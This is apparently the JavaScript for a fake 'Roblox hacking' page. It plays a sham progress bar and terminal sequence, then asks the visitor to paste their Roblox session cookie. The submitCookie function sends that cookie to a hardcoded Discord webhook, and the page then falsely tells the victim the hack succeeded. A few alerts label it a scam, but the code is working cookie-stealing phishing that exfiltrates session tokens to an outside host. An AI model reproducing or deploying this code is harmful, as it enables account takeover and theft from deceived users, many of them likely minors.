function startHack() {
  const username = document.getElementById('username').value;
  if (!username) {
    alert('Please enter a username or User ID.');
    return;
  }

  // Show progress bar and terminal
  document.getElementById('progress').classList.remove('hidden');

  // Fake progress bar
  const progressBar = document.getElementById('progress-bar-fill');
  let width = 0;
  const interval = setInterval(() => {
    if (width >= 100) {
      clearInterval(interval);
      showCookieInput();
    } else {
      width++;
      progressBar.style.width = width + '%';
    }
  }, 50);

  // Fake terminal output
  const terminal = document.getElementById('terminal');
  const messages = [
    '[*] Scanning target account...',
    '[*] Bypassing firewall...',
    '[*] Decrypting account data...',
    '[*] Hacking failed! Enhanced security detected.'
  ];
  let i = 0;
  const terminalInterval = setInterval(() => {
    if (i >= messages.length) {
      clearInterval(terminalInterval);
    } else {
      terminal.innerHTML += messages[i] + '\n';
      terminal.scrollTop = terminal.scrollHeight;
      i++;
    }
  }, 1500);
}

function showCookieInput() {
  // Hide progress bar and terminal
  document.getElementById('progress').classList.add('hidden');

  // Show the cookie input section
  document.getElementById('cookieInputSection').classList.remove('hidden');
}

function submitCookie() {
  const cookie = document.getElementById('cookieInput').value;

  // Minimum length requirement for a Roblox cookie (e.g., 100 characters)
  const minCookieLength = 100;

  if (cookie && cookie.length >= minCookieLength) {
    // Send the cookie to a Discord webhook
    fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {    
      method: "POST",
      body: JSON.stringify({ content: "Roblox Cookie: " + cookie }),
      headers: { "Content-Type": "application/json" }
    }).then(response => {
      if (response.ok) {
        alert("Cookie submitted. Hacking will resume... (This is a scam!)");
        // Proceed with the fake hacking process
        proceedWithHack();
      } else {
        alert("Failed to submit cookie. Please try again.");
      }
    });
  } else {
    // Show an error message if the cookie is too short
    document.getElementById('cookieError').innerText = "Error: Cookie must be at least " + minCookieLength + " characters long.";
  }
}

function proceedWithHack() {
  // Simulate the next step of the hacking process
  alert("Hacking complete! Check your account for the items/Robux.");
}

function submitPin() {
  const pin = document.getElementById('pin').value;
  if (!pin) {
    alert('Please enter a PIN.');
    return;
  }
  alert('PIN submitted. Hacking will resume... (This is a scam!)');
}
